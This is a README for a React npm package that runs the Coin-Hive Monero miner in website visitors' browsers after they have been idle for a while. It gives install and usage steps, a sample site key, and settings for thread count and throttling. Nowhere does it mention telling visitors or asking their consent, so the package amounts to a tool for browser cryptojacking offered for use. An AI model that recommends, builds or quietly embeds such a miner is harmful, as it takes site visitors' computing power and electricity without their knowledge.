# React Coin-Hive

Mine cryptocurrency while your users _hasn’t engaged with your content_ lately. Inspired by the last paragraph of [this article](https://cdb.reacttraining.com/announcing-react-idle-8fc0b9e2d33e).

This uses [Coin-Hive](https://coin-hive.com/) to mine [Monero (XMR)](https://getmonero.org/).

## Installation

```
npm install --save react-coin-hive
```

## Usage

```js
// Anywhere in your app as long as it gets mounted
<CoinHive siteKey='ZM4gjqQ0jh0jbZ3tZDByOXAjyotDbo00'>
```

## Props

- `siteKey`: Your [Coin-Hive Site Key](https://coin-hive.com/settings/sites).

- `timeout`: How long before considering that the user is idle in milliseconds. Default is `30000`.

- `threads`: The number of threads the miner should start with. Default is `2`.

- `throttle`: The fraction of time that threads should be idle. Default is `0`.

- `onInit`: A function that takes the `miner` instance as argument. It's called when the miner is created.

- `onStart`: A function that takes the `miner` instance as argument. It's called every time the miner is started.

- `onStop`: A function that takes the `miner` instance as argument. It's called every time the miner is stopped.

## Disclaimer

I have nothing to do with `coin-hive.com`